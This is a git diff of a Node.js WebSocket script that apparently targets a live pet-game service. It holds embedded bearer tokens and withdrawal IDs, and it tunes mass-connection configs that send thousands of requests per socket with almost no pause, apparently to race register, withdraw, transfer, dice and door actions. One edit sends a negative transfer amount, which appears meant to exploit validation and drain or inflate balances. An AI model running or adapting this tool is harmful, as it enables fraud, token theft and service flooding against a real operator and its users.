@@ -1,23 +1,23 @@
 import WebSocket from "ws";
-import { v4 as uuidv4 } from "uuid";
+import { randomUUID as uuidv4 } from 'crypto';
 
 /** ====== ENV / CONSTANTS ====== */
-const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
+const endpoint = "wss://ws.pett.ai/";
 const origin = "https://app.pett.ai";
 
 // Name & JWT (replace as needed)
 const pettName = `discarded_${Math.floor(Math.random() * 999999)}_t1`;
 const jwt =
-  "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZqdGhvczIwMDAzbDUwYm53OWxmdnMyIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTg0MjI4MTksImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lMTF6bG16MDBrdmw1MGJjeXM2b3psaiIsImV4cCI6MTc1ODQyNjQxOX0.5Ksy3xLXFc1ODbBcexx25EBekMcMEG1AW2JL5nWuH88mYGM5sysGWflZNz6DpoFJMUdaJtaUCIU_gffa7sGhKQ"
+  "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWgzdG9uYnkwMDB4anAwZG5qaDZkNmV4IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NjEyNDgxNjcsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21oM3RvbmR0MDAwempwMGQzeDN4ZTI2MyIsImV4cCI6MTc2MTI1MTc2N30.0n-8uyuRR4KyGZT9TEp79YKO1qmiVZHrGUlIJE98ff701vSy2s1245Mq-J9o9O6X_KdLNVLIZDPKBt3nxx_9aw"
 
 // Start mode
-let type = "jump"; // "register" | "withdraw" | "food" | "atm" | "dice" | "jump" | "door"
+let type = "register"; // "register" | "withdraw" | "food" | "atm" | "dice" | "jump" | "door"
 const useAtm = false;
 
 /** ====== TUNABLE CONNECT LIMITS ====== */
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-const CONNECT_STAGGER_MS = 75;       // time between scheduling new connects
+const CONNECT_STAGGER_MS = 300;       // time between scheduling new connects
 const CONNECT_TIMEOUT_MS = 15000;    // handshake deadline per socket
 const MAX_CONNECT_RETRIES = 4;       // retries per socket
 const MAX_CONCURRENT_CONNECTS = 40;  // simultaneous TCP/TLS handshakes
@@ -51,9 +51,14 @@ let atmInterval = null;
 
 /** ====== WITHDRAWALS POOL ====== */
 const withdrawalIds = [
-"3ab03888-2a67-48fe-9dfa-918de5ab40ba",
-"3ab03888-2a67-48fe-9dfa-918de5ab40ba",
-"3ab03888-2a67-48fe-9dfa-918de5ab40ba"
+  "815be42b-99be-46a3-81f3-cbb24ffff37a",
+  "6d6a442e-1c2e-4f3f-9ac4-f7e6b7dda3d4",
+  "af723d9a-bd6b-4966-8f7d-1b8795dce152",
+  "3ff4be62-4b4e-4255-b1ed-aae2d2dd6c6b",
+  "e4604cf3-c4e3-4da8-9c1a-a3a0c0919e70",
+  "366b06a4-1b00-4f79-b760-ec2820f9e721",
+  "e78e5448-9e0c-4cf1-9b3d-f835d617bc5e",
+  "92ad3bb3-ded7-4cc9-a41d-98114ef0cfdd"
 ];
 
 const shuffled = [...withdrawalIds].sort(() => Math.random() - 0.5);
@@ -132,13 +137,13 @@ const makeDiceString = (betAmount, mode) => JSON.stringify({
 });
 
 const makeAtmString = () => {
-  const amountToSend = Math.floor(tokenBalance - (tokenBalance * 10 / 100));
+  const amountToSend = Math.floor(tokenBalance - (tokenBalance * 1 / 100));
   return JSON.stringify({
     type: "TRANSFER",
     data: {
       params: {
         petTo: "23d430f9-e9f8-4788-a1a3-97c9476dad28",
-        amount: Math.round(amountToSend - (amountToSend * 0.1 / 100)),
+        amount: `-${amountToSend}`,
       }
     },
     nonce: uniqueNonce(),
@@ -150,10 +155,10 @@ const rand1to10 = () => 10;
 
 const CONFIGS = {
   register: {
-    TOTAL_SOCKETS: 25,
-    REQUESTS_PER_SOCKET: 1500,
+    TOTAL_SOCKETS: 700,
+    REQUESTS_PER_SOCKET: 4,
     BLAST_DURATION_MS: 1000,
-    REST_BETWEEN_WAVES_MS: 30000,
+    REST_BETWEEN_WAVES_MS: 1,
   },
   withdraw: {
     TOTAL_SOCKETS: 1,
@@ -169,16 +174,16 @@ const CONFIGS = {
     REST_BETWEEN_WAVES_MS: 1000,
   },
   atm: {
-    TOTAL_SOCKETS: 3,
-    REQUESTS_PER_SOCKET: 1, // unused by the interval, kept for symmetry
-    BLAST_DURATION_MS: 40,
-    REST_BETWEEN_WAVES_MS: 2000,
+    TOTAL_SOCKETS: 10,
+    REQUESTS_PER_SOCKET: 2000, // unused by the interval, kept for symmetry
+    BLAST_DURATION_MS: 1,
+    REST_BETWEEN_WAVES_MS: 1,
   },
   door: {
-    TOTAL_SOCKETS: 10,
-    REQUESTS_PER_SOCKET: 20,
-    BLAST_DURATION_MS: 40,
-    REST_BETWEEN_WAVES_MS: 500,
+    TOTAL_SOCKETS: 15,
+    REQUESTS_PER_SOCKET: 10000,
+    BLAST_DURATION_MS: 100,
+    REST_BETWEEN_WAVES_MS: 1,
   },
   dice: {
     TOTAL_SOCKETS: 4,
@@ -188,9 +193,9 @@ const CONFIGS = {
   },
   jump: {
     TOTAL_SOCKETS: 10,
-    REQUESTS_PER_SOCKET: 5,
-    BLAST_DURATION_MS: 40,
-    REST_BETWEEN_WAVES_MS: 500,
+    REQUESTS_PER_SOCKET: 10,
+    BLAST_DURATION_MS: 1,
+    REST_BETWEEN_WAVES_MS: 1,
   },
 };
 
